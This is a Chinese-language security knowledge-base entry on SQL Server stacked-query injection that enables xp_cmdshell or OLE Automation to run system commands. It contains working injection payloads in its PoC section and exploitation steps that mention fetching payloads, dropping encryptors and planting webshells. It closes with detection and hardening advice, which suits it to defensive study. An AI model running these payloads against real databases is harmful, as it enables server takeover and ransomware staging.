---
id: web-generic-sqli-mssql-stacked-xp-cmdshell
title: SQL Server 堆叠注入开启 xp_cmdshell 与 OLE 自动化实现命令执行
type: scenario
domain: web
path: web/generic/sqli
technique: mssql-stacked-xp-cmdshell
aliases:
- MSSQL 堆叠注入
- xp_cmdshell 提权
- OLE 自动化命令执行
- sp_OACreate
- SQL Server 命令执行
tags:
- sqli
- mssql
- stacked-queries
- xp-cmdshell
- ole-automation
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-C
  verified_at: '2026-11-04T19:08:44+08:00'
  notes: 已对照原文与20张图核对：ERRORLOG 中 xp_cmdshell/Ole Automation/sp_OACreate 配置变更、SYSTEM 登录、命令执行链路一致；通用 SQL 语句为原文链路归纳，未逐条执行
---

## 一句话结论

SQL Server 注入点若以 sysadmin 权限执行且支持堆叠语句，攻击者可用 `sp_configure` 开启 `xp_cmdshell`（或启用 OLE 自动化并用 `sp_OACreate`）直接以 SQL Server 服务账户执行系统命令。

## 原理

SQL Server 的 `SqlClient` 默认允许一个批次里用分号分隔多条语句，注入点拼接后即可堆叠执行任意 SQL。`xp_cmdshell` 是 SQL Server 内置扩展存储过程，会创建 `cmd.exe` 子进程执行命令，进程身份是 SQL Server 服务账户（常见为 `NT SERVICE\MSSQLSERVER` 或配置的域账户）。

`xp_cmdshell` 默认关闭，但拥有 sysadmin/control server 权限的会话可以：

1. `sp_configure 'show advanced options', 1` + `RECONFIGURE`；
2. `sp_configure 'xp_cmdshell', 1` + `RECONFIGURE`；
3. `EXEC xp_cmdshell 'command'`。

若 `xp_cmdshell` 被策略禁用，OLE 自动化是替代路径：开启 `Ole Automation Procedures` 后，用 `sp_OACreate` 实例化 `WScript.Shell` 或 `Shell.Application` 等 COM 对象，再 `sp_OAMethod` 调用 `Run`/`ShellExecute` 执行命令。两条路径都会在 ERRORLOG 留下配置变更记录。

## 触发条件

- 注入语句以 sysadmin 或等价高权限账户执行；
- 数据库连接支持堆叠查询（SQL Server 常见）；
- 攻击者能执行 `sp_configure`/`RECONFIGURE`；
- `xp_cmdshell` 或 OLE 自动化虽默认关闭，但未被策略强制锁定；
- SQL Server 服务账户有执行系统命令所需的本地权限。

## 利用步骤

1. 用 `WAITFOR DELAY` 或子查询确认堆叠执行与权限；
2. 开启高级选项并重配置；
3. 开启 `xp_cmdshell` 并执行 `whoami` 验证身份；
4. 若被拦截，改用 OLE 自动化实例化 COM 对象执行命令；
5. 通过命令下载后续载荷、落地加密器或建立通道；
6. 清理配置（可选；配置项跨重启持久，清理并不彻底）。

## PoC

```sql
-- 确认堆叠与权限
'; WAITFOR DELAY '0:0:5';--

-- 开启 xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';--
```

```sql
-- OLE 自动化替代路径
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @o int;
EXEC sp_OACreate 'WScript.Shell', @o OUTPUT;
EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\inetpub\wwwroot\o.txt';--
```

执行身份通常是 SQL Server 服务账户，而非 Web 应用池账户；回显可通过写入 Web 目录后 HTTP 读取，或走 DNS/HTTP 外带。

## 变体与关联

- 变体：`sp_OACreate` + `Shell.Application`；用 `sqlcmd`/`bcp`/`certutil` 下载载荷；通过 `xp_cmdshell` 写入 WebShell 或计划任务。
- 关联：[[web-dotnet-rest-auth-bypass-header-parameter-override]]（注入入口）；[[defense-incident-response-ransomware-pre-encryption-cleanup]]（后续加密前置行为）。
- 注意：`xp_cmdshell` 与 OLE 配置写入 master 库，跨重启持久；重装系统但保留 SQL 实例时仍可能处于开启状态。

## 检测与防御

- 检测：ERRORLOG 中出现 `Configuration option 'xp_cmdshell' changed from 0 to 1`、`Ole Automation Procedures changed from 0 to 1`、`sp_OACreate`、`odsole70.dll`；`sqlservr.exe` 派生 `cmd.exe`/`powershell.exe`；Web 目录出现命令输出文件。
- 自查：`EXEC sp_configure 'xp_cmdshell'` 查看当前值；检查 ERRORLOG 与 `Eap_OpenAPILog` 等应用审计表。
- 防御：应用数据库账户最小权限，禁止 sysadmin；生产环境保持 `xp_cmdshell` 与 OLE 自动化关闭并用策略锁定；对 `sp_configure` 变更告警；限制 SQL Server 服务账户的出网与本地执行权限；SQL 参数化，消除注入入口。
